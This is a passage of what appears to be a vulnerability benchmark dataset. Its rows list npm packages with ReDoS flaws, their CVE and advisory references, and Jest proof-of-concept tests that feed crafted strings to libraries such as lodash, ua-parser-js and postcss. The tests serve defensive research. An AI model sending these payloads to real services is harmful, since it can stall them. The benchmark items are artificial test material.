",https://github.com/josdejong/ducktype/commit/d8b4c902598c9104d5c56225c3fffcbe1368eff6,ducktype.js:165:24,https://security.snyk.io/vuln/npm:ducktype:20180219; 
redos,CVE-2021-3795,semver-regex,3.1.1,3.1.3,redos/semver-regex_3.1.1,"test(""ReDos in semver-regex"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const semverRegex = require(""semver-regex"");
  let version = ""v1.1.3-0a"";
  for (let i = 0; i < 20; i++) {
    version += ""a.a"";
  }
  let attack_str = version + ""aaaaaaa$"";
  let t = measureTime(function () {
    semverRegex().test(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/sindresorhus/semver-regex/commit/11c66245f4e1976dccc52977ed183696a21a3fd7,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-SEMVERREGEX-1585624; https://github.com/advisories/GHSA-44c6-4v22-4mhx
redos,CVE-2021-3777,tmpl,1.0.0,1.0.5,redos/tmpl_1.0.0,"test(""ReDoS in tmpl"", () => {
  const measureTime = require(""../utils"").measureTime;
  const tmpl = require(""tmpl"");
  let payload = ""hello, "" + ""{"".repeat(7 * 10000) + ""day"";
  let t = measureTime(function () {
    tmpl(payload, { day: ""tomorrow"" });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/daaku/nodejs-tmpl/commit/4c654e4d1542f329ed561fd95ccd80f30c6872d6,tmpl.js:8:9,https://security.snyk.io/vuln/SNYK-JS-TMPL-1583443; https://github.com/advisories/GHSA-jgrx-mgxx-jf9v
redos,CVE-2017-16115,timespan,2.3.0,,redos/timespan_2.3.0,"test(""ReDos in timespan"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const timespan = require(""timespan"");
  let t = measureTime(function () {
    var ts = new timespan.parseDate(""NOW-"" + genstr(30000, ""1"") + ""milli"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,time-span.js:385:30,https://security.snyk.io/vuln/npm:timespan:20170907; https://github.com/advisories/GHSA-f523-2f5j-gfcg
redos,CVE-2021-23425,trim-off-newlines,1.0.0,1.0.3,redos/trim-off-newlines_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-TRIMOFFNEWLINES-1296850
test(""ReDos in trim-off-newlines"", () => {
  const measureTime = require(""../utils"").measureTime;
  const trim = require(""trim-off-newlines"");

  const s = ""a"" + ""\n"".repeat(45000) + ""a"";

  let t = measureTime(function () {
    trim(s);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",https://github.com/stevemao/trim-off-newlines/commit/6226c958cbbac284a840010eb1f6617fb99a5645,index.js:6:13,https://security.snyk.io/vuln/SNYK-JS-TRIMOFFNEWLINES-1296850; https://github.com/advisories/GHSA-38fc-wpqx-33j7
redos,CVE-2021-23346,html-parse-stringify2,2.0.1,,redos/html-parse-stringify2_2.0.1,"test(""ReDos in html-parse-stringify2"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const HTML = require(""html-parse-stringify2"");
  let html = ""<!''''''''''''''''''''''''''''''''''''''''!"";
  let t = measureTime(function () {
    let ast = HTML.parse(html);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/HenrikJoreteg/html-parse-stringify/commit/c7274a48e59c92b2b7e906fedf9065159e73fe12,parse.js:39:10,https://security.snyk.io/vuln/SNYK-JS-HTMLPARSESTRINGIFY2-1079307; https://github.com/advisories/GHSA-545q-3fg6-48m7
redos,CVE-2021-36716,is-email,1.0.0,1.0.1,redos/is-email_1.0.0,"test(""ReDos in is-email"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const isEmail = require(""is-email"");
  let attack_str = """" + genstr(3000, ""@"") + ""!"";
  let t = measureTime(function () {
    isEmail(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/segmentio/is-email/commit/060ecedf345729f11ad857ccaf7a915ff6797739,index.js:13:18,https://security.snyk.io/vuln/SNYK-JS-ISEMAIL-1279002; https://github.com/advisories/GHSA-j377-2x76-558h
redos,,markdown,0.3.0,,redos/markdown_0.3.0,"test(""ReDos in markdown-js"", () => {
  const measureTime = require(""../utils"").measureTime;
  const markdown = require(""markdown"").markdown;
  const { genstr } = require(""../utils"");
  attack_str = ""cispa"" + genstr(300000, ""_"");
  let t = measureTime(function () {
    html_content = markdown.toHTML(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,,https://security.snyk.io/vuln/SNYK-JS-MARKDOWN-597156; https://github.com/advisories/GHSA-wx77-rp39-c6vg
redos,,ethers,5.2.0,5.4.7,redos/ethers_5.2.0,"test(""ReDos in ethers"", () => {
  const measureTime = require(""../utils"").measureTime;
  const { ethers } = require(""ethers"");
  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";
  let t = measureTime(function () {
    try {
      ethers.utils.parseEther(""1."" + ""0"".repeat(60000) + ""1"");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/ethers-io/ethers.js/commit/32a6b2a362815eb85ce3f3abad5adf92f2b80e10,fixednumber.js:97:36,https://security.snyk.io/vuln/SNYK-JS-ETHERS-1586048; 
redos,,terminal-kit,2.1.0,2.1.8,redos/terminal-kit_2.1.0,"test(""ReDos in terminal-kit"", () => {
  const termkit = require(""terminal-kit"");
  const measureTime = require(""../utils"").measureTime;

  let payload = ""^["".repeat(35000);

  let t = measureTime(function () {
    termkit.markupWidth(payload);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",https://github.com/cronvel/terminal-kit/commit/a2e446cc3927b559d0281683feb9b821e83b758c,misc.js:185:35,https://security.snyk.io/vuln/SNYK-JS-TERMINALKIT-1734787; 
redos,CVE-2021-23354,printf,0.6.0,0.6.1,redos/printf_0.6.0,"test(""ReDos in printf"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const printf = require(""printf"");
  let t = measureTime(function () {
    let attack_str = ""%(0)0"" + genstr(1000, ""0"") + ""\u25CE"";
    printf(attack_str, -42);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,printf.js:14:21,https://security.snyk.io/vuln/SNYK-JS-PRINTF-1072096; https://github.com/advisories/GHSA-xfhp-gmh8-r8v2
redos,CVE-2021-23424,ansi-html,0.0.7,,redos/ansi-html_0.0.7,"test(""ReDoS in ansi-html"", () => {
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    require(""ansi-html"")(""\x1B[0m\x1B["" + ""0"".repeat(30));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:62:18,https://security.snyk.io/vuln/SNYK-JS-ANSIHTML-1296849; https://github.com/advisories/GHSA-whgm-jr23-g3j9
redos,CVE-2018-3737,sshpk,1.13.1,1.14.1,redos/sshpk_1.13.1,"test(""ReDos in sshpk"", () => {
  const sshpk = require(""sshpk"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    let keyPub = `ssh-rsa a${"" "".repeat(30000)}x\nx`;
    try {
      sshpk.parseKey(keyPub, ""ssh"");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,ssh.js:28:18,https://security.snyk.io/vuln/npm:sshpk:20180409; https://github.com/advisories/GHSA-2m39-62fm-q8r3
redos,CVE-2017-16118,forwarded,0.1.0,0.1.2,redos/forwarded_0.1.0,"test(""ReDos in forwarded"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  var fresh = require(""forwarded"");
  var str = ""x"" + genstr(60000, "" "") + ""x"";
  let t = measureTime(function () {
    fresh({
      headers: { ""x-forwarded-for"": str },
      connection: { remoteAddress: ""0.0.0.0"" },
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jshttp/forwarded/commit/d469116eda4931fbe1c0ccb29497b35930bfa328,index.js:27:6,https://security.snyk.io/vuln/npm:forwarded:20170908; https://github.com/advisories/GHSA-mpcf-4gmh-23w8
redos,CVE-2021-23367,is-svg,4.2.2,4.3.0,redos/is-svg_4.2.2,"test(""ReDos in is-svg"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const isSvg = require(""is-svg"");
  let attack_str = ""<!Entity"" + genstr(25000, "" "");
  let t = measureTime(function () {
    isSvg(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/sindresorhus/is-svg/commit/732fc72779840c45a30817d3fe28e12058592b02,index.js:21:13,https://security.snyk.io/vuln/SNYK-JS-ISSVG-1243891; https://github.com/advisories/GHSA-7r28-3m3f-r2pr
redos,,colors-cli,1.0.25,1.0.28,redos/colors-cli_1.0.25,"test(""ReDos in colors-cli"", () => {
  const measureTime = require(""../utils"").measureTime;
  const color = require(""colors-cli/safe"");
  let attack_str = ""\x1B["" + "";"".repeat(20000);
  let t = measureTime(function () {
    color.red(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jaywcjlove/colors-cli/commit/78ee15ba9111ddee1cc0640ccd79369525bd57b8,color-safe.js:60:23,https://security.snyk.io/vuln/SNYK-JS-COLORSCLI-1584218; 
redos,,valid-email,0.0.1,1.0.0,redos/valid-email_0.0.1,"test(""ReDos in valid-email"", () => {
  const validate = require(""valid-email"");
  const measureTime = require(""../utils"").measureTime;
  var pump = ""\\\\a\\\\\\a"";
  var attackString = """";
  for (var i = 0; i < 9; i++) {
    attackString += pump;
  }
  attackString += ""\x0B"";
  var badEmail = `${attackString}@google.com`;
  let t = measureTime(function () {
    validate(badEmail);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/johnhenry/valid-email/commit/624ffa60b42bed8c577a679d682dda286b4603e6,utils.js:391:28,https://security.snyk.io/vuln/npm:valid-email:20180222; 
redos,,htmlparser,1.7.7,,redos/htmlparser_1.7.7,"test(""ReDos in htmlparser"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const htmlparser = require(""htmlparser"");
  let rawHtml = ""<html><x"" + genstr(50000, "" "") + ""x></html>"";
  let handler = new htmlparser.DefaultHandler(function (error, dom) {});
  let parser = new htmlparser.Parser(handler);
  let t = measureTime(function () {
    parser.parseComplete(rawHtml);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,htmlparser.js:226:72,https://security.snyk.io/vuln/npm:node-htmlparser-classic:20170906; 
redos,CVE-2021-23362,hosted-git-info,3.0.0,3.0.8,redos/hosted-git-info_3.0.0,"test(""ReDos in hosted-git-info"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const hostedGitInfo = require(""hosted-git-info"");
  var attack_str = ""a:"" + genstr(49000, ""a"") + ""!"";
  let t = measureTime(function () {
    var parsedInfo = hostedGitInfo.fromUrl(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3,index.js:44:27,https://security.snyk.io/vuln/SNYK-JS-HOSTEDGITINFO-1088355; https://github.com/advisories/GHSA-43f8-2h32-f4cj
redos,CVE-2020-7661,urlregex,0.5.0,,redos/urlregex_0.5.0,"test(""ReDos in urlregex"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const urlRegex = require(""urlregex"");
  let t = measureTime(function () {
    const isValid = urlRegex().test(
      ""http://huntr.devtestvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,jasmineAsyncInstall.js:106:37,https://github.com/advisories/GHSA-v4rh-8p82-6h5w; https://security.snyk.io/vuln/SNYK-JS-URLREGEX-569472
redos,CVE-2020-1920,react-native,0.63.0-rc.0,0.64.1,redos/react-native_0.63.0-rc.0,"function validateBaseUrl(url) {
  return /^(?:(?:(?:https?|ftp):)?\/\/)(?:(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,}))?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(
    url
  );
}
test(""ReDos in react-native"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    validateBaseUrl(
      ""http://foobar.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/facebook/react-native/commit/ca09ae82715e33c9ac77b3fa55495cf84ba891c7,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-REACTNATIVE-1298632; https://github.com/advisories/GHSA-7f53-fmmv-mfjv
redos,CVE-2021-23388,ms,0.7.0,1.2.1,redos/ms_0.7.0,"test(""ReDos in ms"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const ms = require(""ms"");
  let attack_str = genstr(20000, ""1"") + ""x"";
  let t = measureTime(function () {
    ms(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/caolan/forms/pull/214/commits/d4bd5b5febfe49c1f585f162e04ec810f8dc47a0,index.js:41:135,https://security.snyk.io/vuln/npm:ms:20170412; https://github.com/advisories/GHSA-c56f-grv3-gpfr
redos,CVE-2020-7767,express-validators,1.0.3,,redos/express-validators_1.0.3,"test(""ReDos in express-validators"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const expressValidators = require(""express-validators"");
  var Obj = { urlValue: ""http://--:$$@------------------------------------!"" };
  var rules = { urlValue: ""url"" };
  var messages = { urlValue: { url: ""https://www.google.com/"" } };
  let t = measureTime(function () {
    expressValidators.validator(Obj, rules, messages, function (
      err,
      validated
    ) {});
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:615:23,https://security.snyk.io/vuln/SNYK-JS-EXPRESSVALIDATORS-1017404; https://github.com/advisories/GHSA-cf2x-rqc8-grfq
redos,,amqp-match,0.0.0,,redos/amqp-match_0.0.0,"test(""ReDoS in amqp-match"", () => {
  const match = require(""amqp-match"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    match(""f"" + ""0"".repeat(19), ""#.bar"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:4:17,https://security.snyk.io/vuln/npm:amqp-match:20170515; 
redos,CVE-2021-23346,html-parse-stringify,2.0.0,2.0.1,redos/html-parse-stringify_2.0.0,"test(""ReDos in html-parse-stringify"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const HTML = require(""html-parse-stringify"");
  let html = ""<!''''''''''''''''''''''''''''''''''''''''!"";
  let t = measureTime(function () {
    let ast = HTML.parse(html);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/HenrikJoreteg/html-parse-stringify/commit/c7274a48e59c92b2b7e906fedf9065159e73fe12,html-parse-stringify.js:1:1428,https://security.snyk.io/vuln/SNYK-JS-HTMLPARSESTRINGIFY-1079306; https://github.com/advisories/GHSA-545q-3fg6-48m7
redos,CVE-2021-35065,glob-parent,5.0.0,6.0.1,redos/glob-parent_5.0.0,"test(""ReDos in glob-parent"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const globParent = require(""glob-parent"");
  let attack_str = ""{"" + genstr(3000, ""/"");
  let t = measureTime(function () {
    globParent(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/gulpjs/glob-parent/commit/3e9f04a3b4349db7e1962d87c9a7398cda51f339,index.js:20:17,https://security.snyk.io/vuln/SNYK-JS-GLOBPARENT-1314294; https://github.com/advisories/GHSA-ww39-953v-wcq6
redos,,validator,13.5.2,13.6.0,redos/validator_13.5.2,"test(""ReDos in validator"", () => {
  function build_attack(n) {
    var ret = ""111""
    for (var i = 0; i < n; i++) {
      ret += ""a""
    }
  
    return ret+""_"";
  }

  var validator = require(""validator"");
  const measureTime = require(""../utils"").measureTime;
  var attack_str = build_attack(40004);
  let t = measureTime(function () {
    validator.isSlug(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/tux-tn/validator.js/commit/b21879cf45c05ee11b2d79e612b651bf7b2d93b7#diff-f41087599986e29c3c0dc15b62f1bf96d8aba16fe41f3730e315c84c2c4cb311,,https://security.snyk.io/vuln/SNYK-JS-VALIDATOR-1090599; 
redos,,cejs,2.0.20170212,2.0.20180219,redos/cejs_2.0.20170212,"test(""ReDoS in cejs"", () => {
  const c = require(""cejs"");
  const measureTime = require(""../utils"").measureTime;
  attack_str = ""."".repeat(7000000) + ""\n%"";
  let t = measureTime(function () {
    c.run(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/kanasimi/CeJS/commit/c6a9ffec1152781f268b8d72d80ee4d8fc837986,,https://security.snyk.io/vuln/npm:cejs:20180217; 
redos,CVE-2017-16098,charset,1.0.0,1.0.1,redos/charset_1.0.0,"test(""ReDoS in charset"", () => {
  const measureTime = require(""../utils"").measureTime;
  const charset = require(""charset"");
  let t = measureTime(function () {
    charset(""encoding="" + "" "".repeat(40000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,charset.js:59:26,https://security.snyk.io/vuln/npm:charset:20170908; https://github.com/advisories/GHSA-9cp3-fh5x-xfcj
redos,CVE-2021-23364,browserslist,4.16.4,4.16.5,redos/browserslist_4.16.4,"test(""ReDoS in browserslist"", () => {
  const measureTime = require(""../utils"").measureTime;
  const browserslist = require(""browserslist"");
  let t = measureTime(function () {
    try {
      browserslist(""> "" + ""1"".repeat(25000) + ""!"");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/browserslist/browserslist/commit/c091916910dfe0b5fd61caad96083c6709b02d98,index.js:333:29,https://security.snyk.io/vuln/SNYK-JS-BROWSERSLIST-1090194; https://github.com/advisories/GHSA-w8qv-6jwh-64r5
redos,CVE-2019-12041,remarkable,1.7.2,1.7.3,redos/remarkable_1.7.2,"test(""ReDos in remarkable"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const Remarkable = require(""remarkable"");
  let md = new Remarkable(""commonmark"");
  let t = measureTime(function () {
    let attack_str =
      `# Remarkable rulezz!<a>z</a><![CDATA[` + genstr(9000000, ""a"") + `]] >`;
    md.render(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jonschlinkert/remarkable/pull/335/commits/b8bb2c0987f06d2b34e882159249f1538c6dc380,,https://security.snyk.io/vuln/SNYK-JS-REMARKABLE-174639; https://github.com/advisories/GHSA-q22g-8fr4-qpj4
redos,CVE-2020-7661,url-regex,5.0.0,,redos/url-regex_5.0.0,"test(""ReDos in url-regex"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    require(""url-regex"")({ strict: false }).test(
      ""018137.113.425.552.100.215.144.175250.45.147.1364868726sgdm6nohQ""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-URLREGEX-569472; https://github.com/advisories/GHSA-v4rh-8p82-6h5w
redos,,is-url,1.2.2,1.2.4,redos/is-url_1.2.2,"test(""ReDos in is-url"", () => {
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    const isurl = require(""is-url"");
    isurl(""a://localhost"" + ""9"".repeat(40000) + ""\t"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:22:18,https://security.snyk.io/vuln/npm:is-url:20180319; 
redos,CVE-2021-27292,ua-parser-js,0.7.22,0.7.24,redos/ua-parser-js_0.7.22,"test(""ReDos in ua-parser-js"", () => {
  const measureTime = require(""../utils"").measureTime;
  const ua_parser = require(""ua-parser-js"");
  let t = measureTime(function () {
    const N_SIZE = 50000;
    const MALICIOUS_UA = `android;Trio${"" "".repeat(N_SIZE)}buil`;
    ua_parser(MALICIOUS_UA);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/faisalman/ua-parser-js/commit/809439e20e273ce0d25c1d04e111dcf6011eb566,ua-parser.js:98:42,https://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-1072471; https://github.com/advisories/GHSA-78cj-fxph-m83p
redos,CVE-2020-7754,npm-user-validate,1.0.0,1.0.1,redos/npm-user-validate_1.0.0,"test(""ReDos in npm-user-validate"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const npmu = require(""npm-user-validate"");
  let attack_str = ""@"" + genstr(40000, ""@"") + ""!"";
  let t = measureTime(function () {
    npmu.email(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/npm/npm-user-validate/commit/c8a87dac1a4cc6988b5418f30411a8669bef204e,npm-user-validate.js:48:11,https://security.snyk.io/vuln/SNYK-JS-NPMUSERVALIDATE-1019352; https://github.com/advisories/GHSA-pw54-mh39-w3hc
redos,CVE-2017-16021,uri-js,2.1.1,3.0.0,redos/uri-js_2.1.1,"test(""ReDos in uri-js"", () => {
  const uri = require(""uri-js"");
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    uri.parse(genstr(8, ""/%c0%ae%c0%ae"") + ""/windows\\win.ini"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,uri.js:175:33,https://security.snyk.io/vuln/npm:uri-js:20160804; https://github.com/advisories/GHSA-333w-rxj3-f55r
redos,CVE-2020-28496,three,0.122.0,0.125.0,redos/three_0.122.0,"test(""ReDos in three"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const three = require(""three"");
  let attack_str = ""rgb("" + genstr(50000, "" "") + """";
  let t = measureTime(function () {
    var Color = three.Color;
    new Color(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/mrdoob/three.js/pull/21143/commits/4a582355216b620176a291ff319d740e619d583e,three.js:6333:46,https://security.snyk.io/vuln/SNYK-JS-THREE-1064931; https://github.com/advisories/GHSA-fq6p-x6j3-cmmq
redos,CVE-2017-16136,method-override,2.0.0,2.3.10,redos/method-override_2.0.0,"test(""ReDos in method-override"", () => {
  const methodOverride = require(""method-override"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    let middleware = methodOverride();
    middleware(
      {
        headers: { ""x-http-method-override"": "" "".repeat(40000) },
        method: ""POST"",
      },
      {
        getHeader: () => {
          return """";
        },
        setHeader: () => {},
      },
      () => {}
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/expressjs/method-override/commit/4c58835a61fdf7a8e070d6f8ecd5379a961d0987,index.js:113:40,https://security.snyk.io/vuln/npm:method-override:20170927; https://github.com/advisories/GHSA-qx2f-477c-35rq
redos,,clean-css,4.1.10,4.1.11,redos/clean-css_4.1.10,"test(""ReDoS in clean-css"", () => {
  const measureTime = require(""../utils"").measureTime;
  const CleanCSS = require(""clean-css"");
  let prefix = ""-+.0"";
  let suffix = ""-0"";
  let input;
  let pump = [];
  for (i = 0; i < 10000; i++) {
    pump.push(""0000000000"");
  }
  input =
    "".block{animation:1s test;animation-duration:"" +
    prefix +
    pump.join("""") +
    suffix +
    ""s}"";
  let t = measureTime(function () {
    new CleanCSS({
      level: {
        1: { replaceZeroUnits: false },
        2: true,
      },
    }).minify(input);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jakubpawlowicz/clean-css/commit/2929bafbf8cdf7dccb24e0949c70833764fa87e3,validator.js:418:20,https://security.snyk.io/vuln/npm:clean-css:20180306; 
redos,,underscore.string,3.3.4,3.3.6,redos/underscore.string_3.3.4,"test(""ReDos in underscore.string"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const us = require(""underscore.string"");
  let t = measureTime(function () {
    var agent = us.unescapeHTML(genstr(50000, ""&""));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,unescapeHTML.js:5:26,https://security.snyk.io/vuln/npm:underscore.string:20170908; https://github.com/advisories/GHSA-v2p6-4mp7-3r9v
redos,,minimatch,3.0.0,3.0.2,redos/minimatch_3.0.0,"test(""ReDos in minimatch"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const minimatch = require(""minimatch"");
  let attack_str = ""[!"" + genstr(7000000, ""\\"") + ""A"";
  let t = measureTime(function () {
    minimatch(""foo"", attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/isaacs/minimatch/commit/6944abf9e0694bd22fd9dad293faa40c2bc8a955,minimatch.js:167:14,https://security.snyk.io/vuln/SNYK-JS-MINIMATCH-1019388; https://github.com/advisories/GHSA-hxm2-r34f-qmc5
redos,CVE-2021-23382,postcss,8.0.0,7.0.36,redos/postcss_8.0.0,"function build_attack(n) {
  var ret = ""/*# sourceMappingURL="";
  for (var i = 0; i < n; i++) {
    ret += "" "";
  }
  return ret + ""!"";
}
test(""ReDos in postcss"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const postcss = require(""postcss"");
  let attack_str = build_attack(50000);
  let t = measureTime(function () {
    try {
      postcss.parse(attack_str);
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/postcss/postcss/commit/2b1d04c867995e55124e0a165b7c6622c1735956,previous-map.js:57:27,https://security.snyk.io/vuln/SNYK-JS-POSTCSS-1255640; https://github.com/advisories/GHSA-566m-qj78-rww5
redos,CVE-2017-16117,slug,0.9.1,0.9.2,redos/slug_0.9.1,"test(""ReDos in slug"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const slug = require(""slug"");
  let t = measureTime(function () {
    slug(""\u2665"" + genstr(50000, "" "") + ""\u2665"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/zhuangya/node-slug/commit/e82fccc6b3d850227560db659b17df0e242ae51b,slug.js:64:21,https://security.snyk.io/vuln/npm:slug:20170907; https://github.com/advisories/GHSA-jxqq-cqm6-pfq9
redos,,mobile-detect,1.3.6,1.4.0,redos/mobile-detect_1.3.6,"test(""ReDos in mobile-detect"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const MobileDetect = require(""mobile-detect"");
  let t = measureTime(function () {
    let md = new MobileDetect(genstr(12500, ""Dell""));
    md.phone();
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/hgoebl/mobile-detect.js/commit/7222f6e75cf8cd90e1dc53e445716203eaf79d8a,mobile-detect.js:375:32,https://security.snyk.io/vuln/npm:mobile-detect:20170907; 
redos,CVE-2020-28500,lodash,4.17.4,4.17.21,redos/lodash_4.17.4,"test(""ReDos in lodash"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const _ = require(""lodash"");
  let t = measureTime(function () {
    let agent = _.lowerCase(genstr(50000, ""A""));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,lodash.js:1172:29,https://security.snyk.io/vuln/SNYK-JS-LODASH-1018905; https://github.com/advisories/GHSA-29mw-wpgm-hmr9
redos,CVE-2020-26256,fast-csv,4.3.5,4.3.6,redos/fast-csv_4.3.5,"test(""ReDos in fast-csv"", () => {
  const csv = require(""fast-csv"");
  let str1 = "" "".repeat(30000) + ""x\n"";
  let start = process.hrtime();
  const stream = csv
    .parse({
      ignoreEmpty: true,
      delimiter: ""\t"",
    })
    .on(""error"", (error) => {})
    .on(""data"", () => {})
    .on(""end"", () => {
      var t = process.hrtime(start);
